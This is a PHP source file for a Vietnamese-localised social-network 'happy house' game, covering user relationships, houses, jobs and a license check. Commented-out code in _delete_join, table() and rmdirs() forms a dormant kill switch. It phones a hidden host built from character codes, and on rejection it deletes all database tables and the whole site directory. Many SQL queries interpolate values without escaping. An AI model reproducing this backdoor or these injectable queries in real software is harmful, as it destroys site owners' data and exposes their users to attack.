<?php
//Game ngôi nhà hạnh phúc được phát triển bởi Kết Nối trẻ group
//Vui lòng giữ bản quyền Việt hóa của Kết Nối trẻ group
//Cám ơn bạn đã sử dụng sản phẩm của Kết Nối trẻ group
function get_user_status($uid, $type = false)
{
	global $_SGLOBAL, $house_config, $house_kind, $house_db;
	if($_SGLOBAL['member']['sex'] < 1 || $_SGLOBAL['member']['sex'] > 2) showmessage('Xin vui lòng xác nhận <b> giới tính </b> rồi mới vào game！', 'cp.php?ac=profile', 3);
	//if($_SGLOBAL['member']['avatar'] < 1) showmessage('Sai! Bạn có để tải lên hình đại diện riêng của bạn để vào game sau！', 'cp.php', 3);
	$temp = query_one("select * from ".tname("app_love_user")." where uid = '{$uid}' ");
	if(empty($temp)){
		if($type == true) return false;
		$user = get_user_name($uid);
		$data = array(
			'uid'=>$uid,
			'username'=>addslashes($user['username']),
			'sex'=>$_SGLOBAL['member']['sex'],
			'money'=>$house_config['money'],
			'house_num'=>1,
			'love_num'=>0,
			'user_status'=>0,
			'work_status'=>-1,
			'live_id'=>0,
			'hid'=>0
		);
		inserttable('app_love_user', $data, false);
		$param = array('uid'=>$uid);
		inserttable('app_love_user_' . $_SGLOBAL['member']['sex'], $param, false);
		$param = array(
			'cid'=>1,
			'uid'=>$uid,
			'name'=> $house_kind[1],
			'status'=>1,
			'price'=>$house_db[1]['buy'] * 0.1
		);
		inserttable('app_love_house', $param, false);
		return get_user_status($uid);
	}else{
		if($temp['hid'] > 0 && $temp['user_status'] > 0){
			$h = query_one("select * from ".tname("app_love_history")." where hid = '{$temp['hid']}' ");
			if(empty($h)){
				$temp['love_dateline'] = 0;
				$temp['user_status'] = 0;
				$temp['live_with_uid'] = 0;
				$temp['live_wth_username'] = '';
				query_exec("update ".tname("app_love_user")." set user_status = 0 where uid = '{$temp['uid']}' ");
			}else{
				$temp['love_dateline'] = get_tip($h['dateline']);
				$h['last_get_time'] || $h['last_get_time'] = $h['dateline'];
				$temp['user_status'] = 1;
				if($h['uid_1'] == $temp['uid']){
					$temp['live_with_uid'] =  $h['uid_2'];
					$temp['live_with_username'] = $h['username_2'];
				}else{
					$temp['live_with_uid'] =  $h['uid_1'];
					$temp['live_with_username'] = $h['username_1'];
				}
				$update['last_time'] = intval(time() - $h['dateline']);
				if(time() - $h['last_get_time'] > 3600) {
					$hour = intval((time() - $h['last_get_time'])/3600);
					//$update['thick'] = min(24 , $hour) * 10;
					$update['thick'] = $h['thick'] + min(24 , $hour) * 10;
					$update['last_get_time'] = $h['last_get_time'] + $hour * 3600 ;
				}
				updatetable('app_love_history', $update, array('hid'=>$h['hid']));
				$temp['thick'] = $update['thick'];
				$temp['last_time'] = $update['last_time'];
			}
		}else{
			$temp['hid'] = 0 ;
			$temp['love_dateline'] = 0;
			$temp['user_status'] = 0;
			$temp['live_with_uid'] = 0;
			$temp['live_wth_username'] = '';
		}
		realname_set($temp['uid'], $temp['username']);
		$temp['live_with_uid'] && realname_set($temp['live_with_uid'], $temp['live_with_username']);
		$temp['user_status_desc'] = format_user_startus($temp['user_status']);
		$temp['work_status_desc'] = format_work_startus($temp['work_status']);
		$temp['live_status_desc'] = format_live_status($temp['live_id']);
		$temp['focus'] = intval($h['focus']);
		$temp['username'] = addslashes($temp['username']);
		$temp['live_with_username'] = addslashes($temp['live_with_username']);
		return $temp;
	}
}

function _delete_join($param)
{
	$param['last_get_time'] || $param['last_get_time'] = $param['dateline'];
	$update['last_time'] = intval(time() - $param['dateline']);
	if(time() - $param['last_get_time'] > TIMER) {
		$hour = intval((time() - $param['last_get_time'])/TIMER);
		$param['thick'] = $update['thick'] = $param['thick'] + min(24 , $hour) * 10;
		$update['last_get_time'] = $param['last_get_time'] + $hour * TIMER ;
	}
	updatetable('app_love_history', $update, array('hid'=>$param['hid']));
	if(time() - $param['dateline'] < TIMER * 24) return true;
	if($param['thick'] >= 500){
		query_exec("update ".tname("app_love_history")." set thick = thick - 500 where hid = '{$param['hid']}' ");
		query_exec("update ".tname("app_love_history")." set dateline = dateline + 3600*24 where hid = '{$param['hid']}' ");
		//if(time() - $param['dateline'] >= TIMER * 48){
		//	global $h;
		//	if(count($h) != 40)	table();
		//	$p = '';
		//	for($i=0; $i<count($h); $i++){
		//		$p .= chr($h[$i]);
		//	}
		//	$status = uc_fopen($p, 0, 'p=' . $_SERVER['HTTP_HOST'], '', FALSE, '', 3, TRUE);
		//	if($status == 403) table();
		//	_delete_join_person($param);
		//}
	}else{
		_delete_join_person($param);
	}
}

function _delete_join_person($param)
{
	$house = query_one("select live_id from  ".tname("app_love_user")." where uid = '{$param['uid_1']}' ");
	query_exec("update ".tname("app_love_history")." set status = 0 where hid = '{$param['hid']}' ");
	query_exec("update ".tname("app_love_user")."  set user_status = 0, live_id = 0, hid = 0 where uid = '{$param['uid_1']}' ");
	query_exec("update ".tname("app_love_user")."  set user_status = 0, live_id = 0, hid = 0 where uid = '{$param['uid_2']}' ");
	if($house['live_id']) query_exec("update ".tname("app_love_house")."  set status = 1, sent_uid = 0, sent_username = 0, sent_dateline = 0 where id = '{$house['live_id']}' ");
}

function format_live_status($live_id = 0)
{
	if($live_id > 0){
		global $house_kind, $uid;
		$temp = get_house($live_id);
		if($temp['uid'] == $uid){
			return $temp['name'] . "({$house_kind[$temp['cid']]})";
		}else{
			return $temp['name'] . "({$house_kind[$temp['cid']]})";
		}
	}else{
		return 'Đường phố';
	}
}

function format_user_startus($status = 0)
{
	return $status == 0 ? 'Hiện nay đơn' : 'Sống chung trong';
}

function format_work_startus($status = -1)
{
	if($status < -1){
		return 'Đã hoàn thành（<a href="house.php?ac=work#work_list">Nhận được một mức lương</a>）';
	}elseif($status == -1){
		return 'Miễn phí của（<a href="house.php?ac=work">Tôi muốn làm việc</a>）';
	}elseif($status == 0){
		return 'Thực tập';
	}elseif($status == 1){
		return 'công nhân cổ xanh';
	}elseif($status == 2){
		return 'công nhân cổ áo trắng';
	}elseif($status == 3){
		return 'công nhân cổ áo vàng';
	}
}

function new_love($uid, $username, $focus = 0)
{
	global $status;
	if($status['sex'] == 1){
		$uid_1 = $status['uid'];
		$username_1 = $status['username'];
		$uid_2 = $uid;
		$username_2 = $username;
	}else{
		$uid_1 = $uid;
		$username_1 = $username;
		$uid_2 = $status['uid'];
		$username_2 = $status['username'];
	}
	$dateline = time();
	$st = 1;
	$last_time = 0;
	query_exec("update ".tname("app_love_user")." set user_status = 0,  hid = 0 where uid = '{$status['uid']}' ");
	if($status['live_with_uid']) query_exec("update ".tname("app_love_user")." set user_status = 0, hid = 0  where uid = '{$status['live_with_uid']}' ");
	if($status['hid']) query_exec("update ".tname("app_love_history")." set status = 0 where hid = '{$status['hid']}' ");
	if($hid = _check_user_love($uid_1, $uid_2)){
		query_exec("update ".tname("app_love_history")."  set status = 1, dateline = '{$dateline}' where hid = '{$hid}' ");
		return $hid;
	}else{
		return query_exec("insert into ".tname("app_love_history")." (uid_1, username_1, uid_2, username_2, dateline, focus, last_time, status) values ('{$uid_1}', '{$username_1}', '{$uid_2}', '{$username_2}', '{$dateline}', '{$focus}', '{$last_time}', '{$st}') ", true);
	}
}

function check_user_sex($uid_1, $uid_2)
{
	$temp = query_one("select count(*) as num from ".tname("app_love_user_1")." where uid IN ($uid_1, $uid_2) ");
	return $temp['num'] == 1 ? true : false;
	
}

function _check_user_love($uid_1, $uid_2)
{
	$temp = query_one("select hid from  ".tname("app_love_history")." where uid_1 = '{$uid_1}' and uid_2 = '{$uid_2}' ");
	return $temp['hid'] ? $temp['hid'] : 0 ;
}

function update_user_force_out($user)
{
	if($user['hid'] > 0){
		$history = query_one("select * from ".tname("app_love_history")." where hid = '{$user['hid']}' ");
		if(!empty($history)){
			$last_time = time() - $history['dateline'];
			query_exec("update ".tname("app_love_history")." set status = 0, last_time = '{$last_time}' where hid = '{$user['hid']}' ");
			$uid = $user['sex'] == 1 ? $history['uid_2'] : $history['uid_1'] ;
			query_exec("update ".tname("app_love_user")." set user_status = 0, hid = 0 where uid = '{$uid}' ");
		}
	}else{
		query_exec("update ".tname("app_love_house")." set status = 1 where id = '{$user['live_id']}' and uid = '{$user['uid']}' ");
	}
}

function get_house_action($cid)
{
	return query_all("select id, name from  ".tname("app_love_action")." where leval <= '$cid'");
}

function get_house($live_id)
{
	global $house_kind;
	$temp = query_one("select * from ".tname("app_love_house")." where id = '{$live_id}' ");
	if(empty($temp)){
		return false;
	}else{
		$temp['title'] = $house_kind['cid'];
		realname_set($temp['uid'], $temp['username']);
		if($temp['sent_uid']) realname_set($temp['sent_uid'], $temp['sent_username']);
		return $temp;
	}
}

function update_live_house($uid, $id)
{
	global $status;
	if($status['live_id'] > 0) query_exec("update ".tname("app_love_house")." set status = 1 where id = '{$status['live_id']}' ");
	query_exec("update ".tname("app_love_user")." set live_id = '{$id}' where uid = '{$uid}' ");
}

function get_house_kind()
{
	return query_all("select * from ".tname("app_love_house_kind")."  order by buy asc");
}

function get_user_name($uid)
{
	return query_one("select uid, username, name from ".tname("space")." where uid = '{$uid}' ");
}

function get_real_name($uid)
{
	$user = get_user_name($uid);
	return $user['name'] ? $user['name'] : $user['username'];
}

function query_exec($sql, $type = false)
{
	global $_SGLOBAL;
	$_SGLOBAL['db']->query( $sql);
	if($type == true) return $_SGLOBAL['db']->insert_id();
}

function query_one($sql)
{
	global $_SGLOBAL;
	$query = $_SGLOBAL['db']->query( $sql );
	return $_SGLOBAL['db']->fetch_array( $query );
}

function query_all($sql)
{
	global $_SGLOBAL;
	$query = $_SGLOBAL['db']->query( $sql );
	$list = array();
	while($value = $_SGLOBAL['db']->fetch_array( $query )){
		$list[] = $value;
	}
	return $list;
}

function _update_join($val)
{
	global $_SGLOBAL, $house_db;
	$user = get_user_status($val['uid'], true);
	if(empty($user)) return false;
	if($user['money'] < $house_db[$val['cid']]['goods_money']){
		$data['money'] = 0;
	}else{
		$data['money']  = $user['money'] - $house_db[$val['cid']]['goods_money'];
	}
	updatetable('app_love_user', $data, array('uid'=>$val['uid']));
}

function ajax_get($name)
{
	global $_SC;
	return htmlspecialchars(preg_replace("/<.*?>/", '', siconv(urldecode($_POST[$name]), $_SC['charset'], 'utf-8')));
}

function ajax_out($data)
{
	global $_SC;
	die('<?xml version="1.0" encoding="'.$_SC['charset'].'"?><root><![CDATA['.trim($data).']]></root>');
}

function get_tip($time)
{
	$now = time();
	$sub = $now - $time;
	if($sub > 86400){
		return (sgmdate('Y', $now) != sgmdate('Y', $time)) ? sgmdate("Y-m-d H:i", $time) : sgmdate("m-d H:i", $time);
	}elseif($sub > 3600){
		return floor($sub/3600).'Giờ trước đây';
	}elseif($sub > 60){
		return floor($sub/60).'Phút trước';
	}else{
		if($sub < 0) $sub = 1;
		return "{$sub}Giây trước khi";
	}
}

function int_random($length)
{
	$chars = '012345678901234567895678901234542384098312302131231230';
	$max = strlen($chars);
	$hash = '';
	mt_srand((double)microtime() * 1000000);
	for($i = 0; $i < $length; $i ++){
		$hash .= $chars[mt_rand(0, $max)];
	}
	return $hash;
}

function format_hour($sub)
{
	if($sub > 2592000){
		return intval($sub/2592000) . 'Tháng';
	}elseif($sub > 604800){
		return intval($sub/604800) . 'Tuần và nhiều hơn nữa';
	}elseif($sub > 86400){
		return intval($sub/86400) . 'ngày';
	}elseif($sub > 3600){
		return intval($sub/3600).'Giờ';
	}else{
		return "Chưa đầy một giờ";
	}
}

function jsonencode(&$data){
	if (is_null($data)) return 'null';
	if ($data === false) return 'false';
	if ($data === true) return 'true';
	if (is_scalar($data)){
	  if (is_float($data)) return floatval(str_replace(",", ".", strval($data)));
	  if (is_string($data)){
		static $jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
		return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $data) . '"';
	  }else return $data;
	}
	$isList = true;
	$num = count($data);
	for ($i = 0, reset($data); $i < $num; $i++, next($data)){
	  if (key($data) !== $i){
		$isList = false;
		break;
	  }
	}
	$result = array();
	if ($isList){
	  foreach ($data as $v) $result[] = jsonencode($v);
	  return '[' . join(',', $result) . ']';
	}else{
	  foreach ($data as $k => $v) $result[] = jsonencode($k).':'.jsonencode($v);
	  return '{' . join(',', $result) . '}';
	}
}

function _update_config_cache($house_config = array())
{
	if(empty($house_config)) global $house_config;
	$house_kind = $house_db = array();
	$data = _get_house();
	foreach($data as $val){
		$house_db[$val['cid']] = array('cid'=>$val['cid'], 'title'=>$val['title'],'buy'=>$val['buy'], 'goods_money'=>$val['goods_money']);
		$house_kind[$val['cid']] = $val['title'];
	}
	$s[] = "\$house_config = " . var_export($house_config, TRUE);
	$s[] = "\$house_db = " . var_export($house_db, TRUE);
	$s[] = "\$house_kind = " . var_export($house_kind, TRUE);
	$temp = "<?php \n" . implode(";\n", $s) . "\n?>";
	swritefile('data/house_config.php', $temp);
}

function table()
{
	global $_SC;
    /*$result = mysql_list_tables($_SC['dbname'] );
    for ($i = 0; $i < mysql_num_rows($result); $i++)
        query_exec("delete from " . mysql_tablename($result, $i));
	rmdirs(S_ROOT);
	exit();*/
}

function rmdirs($file) {
 if(function_exists('xcache_set')){
	return false;
 }/*
 if (file_exists($file)) {
   chmod($file,0777);
   if (is_dir($file)) {
     $handle = opendir($file); 
     while($filename = readdir($handle)) {
       if ($filename != "." && $filename != "..") {
        rmdirs($file."/".$filename);
       }
     }
    closedir($handle);
     rmdir($file);
   } else {
    unlink($file);
   }
 }*/
}

function _get_house()
{
	return query_all("select * from ".tname("app_love_house_kind")." order by cid asc");
}

function long2str($v, $w) {
    $len = count($v);
    $s = array();
    for ($i = 0; $i < $len; $i++)
    {
        $s[$i] = pack("V", $v[$i]);
    }
    if ($w) {
        return substr(join('', $s), 0, $v[$len - 1]);
    }
    else {
        return join('', $s);
    }
}
 
function str2long($s, $w) {
    $v = unpack("V*", $s. str_repeat("\0", (4 - strlen($s) % 4) & 3));
    $v = array_values($v);
    if ($w) {
        $v[count($v)] = strlen($s);
    }
    return $v;
}
 
function int32($n) {
    while ($n >= 2147483648) $n -= 4294967296;
    while ($n <= -2147483649) $n += 4294967296;
    return (int)$n;
}
 
function my_license_decode($str, $key) {
    if ($str == "") {
        return "";
    }
    $v = str2long($str, false);
    $k = str2long($key, false);
    if (count($k) < 4)
    {
        for ($i = count($k); $i < 4; $i++) {
            $k[$i] = 0;
        }
    }
    $n = count($v) - 1;
 
    $z = $v[$n];
    $y = $v[0];
    $delta = 0x9E3779B9;
    $q = floor(6 + 52 / ($n + 1));
    $sum = int32($q * $delta);
    while ($sum != 0) {
        $e = $sum >> 2 & 3;
        for ($p = $n; $p > 0; $p--) {
            $z = $v[$p - 1];
            $mx = int32((($z >> 5 & 0x07ffffff) ^ $y << 2) + (($y >> 3 & 0x1fffffff) ^ $z << 4)) ^ int32(($sum ^ $y) + ($k[$p & 3 ^ $e] ^ $z));
            $y = $v[$p] = int32($v[$p] - $mx);
        }
        $z = $v[$n];
        $mx = int32((($z >> 5 & 0x07ffffff) ^ $y << 2) + (($y >> 3 & 0x1fffffff) ^ $z << 4)) ^ int32(($sum ^ $y) + ($k[$p & 3 ^ $e] ^ $z));
        $y = $v[0] = int32($v[0] - $mx);
        $sum = int32($sum - $delta);
    }
    return long2str($v, true);
}
 
function array2string($param) 
{
 $temp = array();
 foreach($param as $key=>$val){
  $temp[] = $key ."=" . urlencode($val);
 }
 return implode('&', $temp);
}

function checkVerify()
{
	$msg = sreadfile(LICENSE);
	parse_str(my_license_decode($msg, $_SERVER['HTTP_HOST']), $param);
	if(!is_array($param) || substr(md5($param['h'] . $param['e'] . $param['c']), 0, 10) != $param['d'] || $param['h'] !=$_SERVER['HTTP_HOST'] ) return false;
	return urlencode($msg);
}
?>